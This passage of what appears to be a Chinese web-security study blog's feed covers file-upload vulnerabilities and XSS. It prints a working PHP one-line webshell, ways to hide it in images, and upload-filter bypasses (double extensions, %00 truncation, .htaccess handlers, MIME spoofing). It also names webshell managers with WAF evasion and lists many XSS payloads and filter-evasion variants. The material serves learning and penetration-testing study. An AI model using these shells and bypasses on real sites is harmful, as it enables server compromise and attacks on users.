before=”2017-10-01”</td><td>时间范围段搜索</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/07/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/07/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="WebShell-与-WebShell-管理工具"><a href="#WebShell-与-WebShell-管理工具" class="headerlink" title="WebShell 与 WebShell 管理工具"></a>WebShell 与 WebShell 管理工具</h1><h2 id="什么叫做WebShell"><a href="#什么叫做WebShell" class="headerlink" title="什么叫做WebShell"></a>什么叫做WebShell</h2><ul><li>WebShell , 简称网页后门。简单来说它是运行在Web应用之上的远程控制程序</li><li>webShell其实就是一张网页，由PHP、JSP、ASP、ASP.NET等这类web应用程序语言开发，但webShell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能</li></ul><p><strong>常见的WebShell有哪些？</strong></p><ul><li>大马、小马、各种马…等</li><li>拥有较完整功能的webshell，我们一般称为<code>大马</code>。</li><li>功能简易的webshell称为<code>小马</code>。</li><li>除此之外还存在<code>一句话木马、菜刀马、脱库马</code>等等的名词，是对于webShell功能或者特性的简称</li></ul><p><strong>一句话木马特点</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码短，只有一行代码。</span><br><span class="line">场景多，可以单独生成文件，也可以插入到图片中。</span><br><span class="line">安全性高，隐匿性强，可变形免杀</span><br></pre></td></tr></table></figure><p><strong>小马特点</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">能放文件的网站我们可以在木马中添加文件上传功能</span><br><span class="line">体积小，功能少</span><br><span class="line">只有文件上传功能</span><br></pre></td></tr></table></figure><p><strong>大马特点</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">体积大，功能全。能够管理数据库、文件管理、</span><br><span class="line">对站点进行快速的信息收集，甚至能够提权。</span><br></pre></td></tr></table></figure><h2 id="一句话木马解读"><a href="#一句话木马解读" class="headerlink" title="一句话木马解读"></a>一句话木马解读</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>$_POST[x]</code>  获取 POST请求参数中X的，例如POST请求中传递<code>x=phpinfo();</code>，那么<code>$_POST[x]</code>就等同于<code>phpinfo();</code></li><li><code>eval()</code> 将字符串当做PHP代码去执行，例如<code>eval(&#39;phpinfo();&#39;)</code>，其中<code>phpinfo();</code>会被当做PHP代码去执行。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span>   实际上的传递过程是这样的</span><br><span class="line">↓</span><br><span class="line">↓</span><br><span class="line">↓</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="meta">?&gt;</span> 实际的语句是这样的 </span><br></pre></td></tr></table></figure><ul><li>我们通过该<code>webshell</code>，传递<code>任意PHP代码</code>，让其去执行，从而达到<code>任意代码执行</code></li><li>错误控制运算符，当将 <code>@</code>放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 <code>忽略</code>掉</li></ul><h2 id="WebShell-管理工具"><a href="#WebShell-管理工具" class="headerlink" title="WebShell 管理工具"></a>WebShell 管理工具</h2><p><strong>常用 WebShell 管理工具</strong></p><ul><li>中国菜地</li><li>中国蚁剑</li><li>冰蝎</li><li>哥斯拉</li><li>…</li></ul><p><strong>蚁剑</strong></p><p><code>weevely</code> 命令行工具，kali自带，可以自己生成一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely 目标url 密码</span><br></pre></td></tr></table></figure><p><strong>冰蝎</strong></p><p>动态二进制加密网站管理客户端，自带多个一句话木马</p><p><strong>哥斯拉</strong></p><p>需要Java环境，需要自己生成一句话木马，加密流量，可绕过多种waf和静态拦截等</p><p>密码密钥默认，有效载荷就是需要生成什么环境的木马，有加密方式，可用base64，异或等</p><p>工具在连接时可以添加cookie值以完成相关用户校验</p><h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><blockquote><ol><li>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</li><li>输入系统指令： <code>copy 一张图片.png/b+一句话木马.php/a 生成图片名称.png</code></li><li>这样图片木马就合成好了</li></ol></blockquote><h1 id="文件上传之注入流程"><a href="#文件上传之注入流程" class="headerlink" title="文件上传之注入流程"></a>文件上传之注入流程</h1><ul><li>找到上传的功能，没有的话可以通过数据库比如redis未授权和持久化机制KV写入木马，MySQL的读写机制写入木马</li><li>自动找到网站中文件上传的点：<a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a></li><li>尝试绕过校验，上传文件</li><li>获得文件位置</li><li>蚁剑连接，管理文件</li></ul><h1 id="文件上传漏洞绕过"><a href="#文件上传漏洞绕过" class="headerlink" title="文件上传漏洞绕过"></a>文件上传漏洞绕过</h1><h2 id="客服端绕过"><a href="#客服端绕过" class="headerlink" title="客服端绕过"></a>客服端绕过</h2><p><strong>（1）客户端校验:</strong></p><p>一般都是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传<code>.jpg/.jpeg/.png</code>后缀名的文件，而此时并没有发送数据包。</p><p><strong>（2）绕过方法:</strong></p><p>1.通过火狐插件 NOscript 插件或者禁用 IE 中 JS 脚本；</p><p>2.通过 firbug 插件元素审核修改代码（如删除 <code>onsubmit=&quot;return checkFile()&quot;</code> 事件）；</p><p>3.通过 firbug 元素审核 javascirpt 脚本中添加上传文件类型；</p><p>4.通过利用 burp 抓包改包，先上传一个 gif 类型的木马，然后通过 burp 将其改为<code>asp/php/jsp</code> 后缀名即可 注意：这里修改文件名字后，请求头中的 <code>Content-Length</code> 的值也要改。</p><h2 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h2><p><strong>（1）黑名单扩展名绕过</strong></p><p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</p><p>绕过方法：</p><ul><li>找黑名单扩展名的漏网之鱼 - 比如 iis6.0 中的 asa 和 cer </li><li>可能存在大小写绕过漏洞 - 比如 aSp(iis6.0 中可以）和 pHp（只能在 小于 php5.3.39 中的 linux 中）之中</li><li>能被web容器解析的文件其他扩展名列表：</li></ul><blockquote><p>jsp, jspx ,jspf</p><p>asp asa cer cdx,htr,xml,html</p><p>aspx,ashx,asmx,asax,ascx</p></blockquote><p><strong>（2）黑名单特殊后缀名绕过（利用难度高）</strong></p><p>将Burpsuite截获的数据包中<code>backlion.php</code>名字改为 <code>baclion.php4(php1,php2,php3,php4,php5)</code>, 前提条件是 <code>http.conf</code> 中设置 <code>AddType application/x-httpd-php .php1(php 的版本小于等于 5.3.29 以下)</code></p><p><strong>（3）单双重后缀名绕过</strong></p><p>上传时将 Burpsuite 截的数据包中文件名<code>backlion.php（backlion.asa)</code>改 为 <code>backlion.pphphph(backlion.asasaa)</code>，那么过滤了第一个”php”字符串”后， 开头的’p’和结尾的’hp’就组合又形成了 php</p><p><strong>（4）服务端 MIME 文件类型(Content-Type)绕过</strong></p><p>MIME 的作用：</p><p>使客户端软件，区分不同种类的数据，例如web浏览器就是通过 MIME 类 型来判断文件是GIF图片，还是可打印的 PostScript 文件。web服务器使用 MIME 来说明发送数据的种类，web客户端使用 MIME 来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式的重要标记项</p><p>常用的文件上传类型的 MIME 表：</p><blockquote><p> text/plain（纯文本） text/html（HTML 文档） text/javascript（js 代码） application/xhtml+xml（XHTML 文档） image/gif（GIF 图像） image/jpeg（JPEG 图像） image/png（PNG 图像） video/mpeg（MPEG 劢画） application/octet-stream（二迚制数据） application/pdf（PDF 文档） application/(编程语言) 该种语言的代码 application/msword（Microsoft Word 文件） message/rfc822（RFC 822 形式） multipart/alternative（HTML 邮件的 HTML 形式和纯文本形式，相同内容使 用不同形式表示） application/x-www-form-urlencoded（POST 方法提交的表单）multipart/form-data（POST 提交时伴随文件上传的表单）</p></blockquote><p>绕过方法：上传对文件类型做了限制，可通过 burpsuit 将其他类文件类型 修改为如：<code>Content-Type：image/gif</code> 和 <code>image/jpeg</code> 等运行的文件类型</p><p><strong>等价扩展名绕过</strong></p><div class="table-container"><table><thead><tr><th>文件拓展名</th><th>等价拓展名</th></tr></thead><tbody><tr><td>.php</td><td>.php2, .php3, .php4, .php5, .phps, .phtml</td></tr><tr><td>.asp</td><td>.aspx, .asa, .cer, .cdx</td></tr><tr><td>.asp</td><td>.aspq, .asmx, .ascx, ashx, .asax,</td></tr><tr><td>.jsp</td><td>.jspx, .jsw, .jspf, .jspa, .jhtml</td></tr><tr><td>.html</td><td>.htm</td></tr><tr><td>.zip</td><td>.jar, .war, .ear</td></tr><tr><td>.rar</td><td>.cbr</td></tr><tr><td>.png</td><td>.apng</td></tr><tr><td>.jpeg</td><td>.jpg, .jpe</td></tr><tr><td>.gif</td><td>.giff, .gfa</td></tr></tbody></table></div><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p><strong>（1）配合web容器的解析漏洞：</strong></p><p>IIS中的目录解析漏洞和分号解析漏洞 ：</p><p>将一句话木马的文件名<code>backlion.php</code>，改成 <code>backlion.php.abc</code>(奇怪的不被解析的后缀名都行)。首先， 服务器验证文件扩展名的时候，验证的是<code>.abc</code>，只要该扩展名符合服务器端黑白名单规则，即可上传</p><p>nginx 空字节漏洞 <code>xxx.jpg%00.php</code> 这样的文件名会被解析为php代码运行。</p><p>apache 的解析漏洞，上传如 <code>a.php.rar a.php.gif</code> 类型的文件名，可以避免 对于php文件的过滤机制，但是由于 apache 在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar 等扩展名是 apache 不能识别的， 因此就会直接将类型识别为 php，从而达到了注入php代码的目的</p><p><strong>（2）%00 截断上传绕过</strong></p><p>通过抓包截断将 <strong>backlion.asp.jpg</strong> 后面的一个<strong>.</strong>换成<strong>%00</strong> 在上传的时候即 <strong>backlion.asp%00.jpg</strong>，当文件系统读到<strong>%00</strong> 时，会认为文件已经结束，从而将 <strong>backlion.asp.jpg</strong> 的内容写入到 <strong>backlion.asp</strong> 中，从而达到攻击的目的。<strong>%00</strong> 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截 断上传漏洞，上传格式如下：<strong>bk.asp%00.jpg</strong></p><p><strong>（3）文件头内容检测绕过</strong></p><p>文件头简介</p><p>不同的图片文件都有不同文件头，如： PNG：文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识) GIF：文件头标识 (6 bytes) 47 49 46 38 39(37) 61 上传文件的时候会检查上传文件是否合法，如图片文件是否文件头含有 gif89, 这里可以通过一句话图片木马生成工具 edjpgcom 戒者通过编辑器在木马内容基础上再加了一些文件信息，有点像下面的结构:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><p>Hypertext Access(超文本入口)</p><p><code>.htaccess</code> 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置</p><p>通过 .htaccess 文件，可以实现：网页 301 重定向、自定义404 错误页面、<strong>改变文件扩展名</strong>、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能,网页伪静态（原来是参数请求的动态形式改为html的伪静态形式）就是用这个实现的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;a.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php   <span class="comment">//MIME类型</span></span><br><span class="line">&lt;/FilesMatch&gt;     <span class="comment">//将a.jpg当作php文件处理</span></span><br></pre></td></tr></table></figure><p>把.htaccess上传上去，再上传就可成功</p><ul><li><p>大小写绕过</p><p> <code>shell.PHP</code></p></li><li><p>空格绕过</p><p>windows会自动去掉后缀中的空格，低版本php，抓包改包后缀最后加空格。</p></li><li><p>点绕过</p><p>windows会自动去掉后缀中的点如1.php.会解析为1.php，我们可以抓包后加在后缀中加点上传</p></li><li><p>::$DATA绕过</p><p>抓包，在filename后添加::$DATA，与上述原理一样</p></li><li><p>点空格点绕过</p><p>抓包，在filename后添加. .</p></li><li><p>双写绕过</p><p>用于黑名单替换文件名为空，shell.pphphp变为shell.php</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/07/26/XSS/"/>
      <url>/2023/07/26/XSS/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><h2 id="XSS-漏洞简介"><a href="#XSS-漏洞简介" class="headerlink" title="XSS 漏洞简介"></a>XSS 漏洞简介</h2><p> XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>常见的输出函数有： <code>echo printf print print_r sprintf die var-dump var_export</code></p><h2 id="XSS的原理"><a href="#XSS的原理" class="headerlink" title="XSS的原理"></a>XSS的原理</h2><ul><li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li><li>诱使受害者打开受到攻击的服务器URL。</li><li>受害者在Web浏览器中打开URL，恶意脚本执行。</li></ul><h2 id="XSS的攻击方式"><a href="#XSS的攻击方式" class="headerlink" title="XSS的攻击方式"></a>XSS的攻击方式</h2><ul><li><strong>反射型XSS</strong>：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。一般是后端代码进行处理</li><li><strong>存储型XSS</strong>：&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）</li><li><strong>DOM型XSS</strong>：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理</li></ul><h2 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h2><blockquote><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据<br>10.其它安全问题</p></blockquote><h1 id="常见XSS攻击方式"><a href="#常见XSS攻击方式" class="headerlink" title="常见XSS攻击方式"></a>常见XSS攻击方式</h1><p><strong>scirpt 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; 标签用于定义客户端脚本，比如 <span class="title class_">JavaScript</span>。</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>img 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt; 标签定义 <span class="variable constant_">HTML</span> 页面中的图像。</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>input 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input&gt; 标签规定了用户可以在其中输入数据的输入字段。</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onfocus 事件在对象获得焦点时发生：</span><br><span class="line">&lt;input onfocus=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>竞争焦点，从而触发<code>onblur</code>事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onblur=<span class="title function_">alert</span>(<span class="number">1</span>) autofocus&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>input</code> 标签的 <code>autofocus</code> 属性规定当页面加载时 元素应该自动获得焦点。可以通过<code>autofocus</code>属性自动执行本身的<code>focus</code>事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;alert(1);&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框&lt;br&gt;</span></span><br><span class="line"><span class="string">&quot;</span> onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;    需要鼠标划过输入框&lt;br&gt;</span><br></pre></td></tr></table></figure><p><strong>details 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details&gt; 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 &lt;details&gt; 元素时触发：</span><br><span class="line"></span><br><span class="line">&lt;details ontoggle=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>使用<code>details</code> 标签的 <code>open</code> 属性触发<code>ontoggle</code>事件，无需用户去点击即可触发：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p><strong>svg 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt; 标签用来在<span class="variable constant_">HTML</span>页面中直接嵌入<span class="variable constant_">SVG</span> 文件的代码。</span><br><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p><strong>select 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt; 标签用来创建下拉列表。</span><br><span class="line">&lt;select onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;/select</span><br><span class="line"></span><br><span class="line">通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</span><br><span class="line">&lt;select onfocus=<span class="title function_">alert</span>(<span class="number">1</span>) autofocus&gt;</span><br></pre></td></tr></table></figure><p><strong>iframe 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>video 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt; 标签定义视频，比如电影片段或其他视频流。</span><br><span class="line"></span><br><span class="line">&lt;video&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>audio 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。</span><br><span class="line"></span><br><span class="line">&lt;audio src=x  onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p><strong>body 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt; 标签定义文档的主体。</span><br><span class="line"></span><br><span class="line">&lt;body onload=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>textarea 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt; 标签定义一个多行的文本输入控件。</span><br><span class="line"></span><br><span class="line">&lt;textarea onfocus=<span class="title function_">alert</span>(<span class="number">1</span>); autofocus&gt;</span><br></pre></td></tr></table></figure><p><strong>keygen 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt; <span class="comment">//仅限火狐</span></span><br></pre></td></tr></table></figure><p><strong>marquee 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;<span class="regexp">/marquee&gt; /</span><span class="regexp">/Chrome不行，火狐和IE都可以</span></span><br></pre></td></tr></table></figure><p><strong>isindex 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="comment">//仅限于IE</span></span><br></pre></td></tr></table></figure><h1 id="常见基本过滤方法"><a href="#常见基本过滤方法" class="headerlink" title="常见基本过滤方法"></a>常见基本过滤方法</h1><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span>，注释符号绕过；/符号绕过；</span><br><span class="line"></span><br><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br><span class="line"></span><br><span class="line">也可以：</span><br><span class="line"></span><br><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="引号过滤"><a href="#引号过滤" class="headerlink" title="引号过滤"></a>引号过滤</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">`xss`</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="括号过滤"><a href="#括号过滤" class="headerlink" title="括号过滤"></a>括号过滤</h2><p>当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span></span><br></pre></td></tr></table></figure><h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><p><strong>大小写绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>双写绕过</strong></p><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 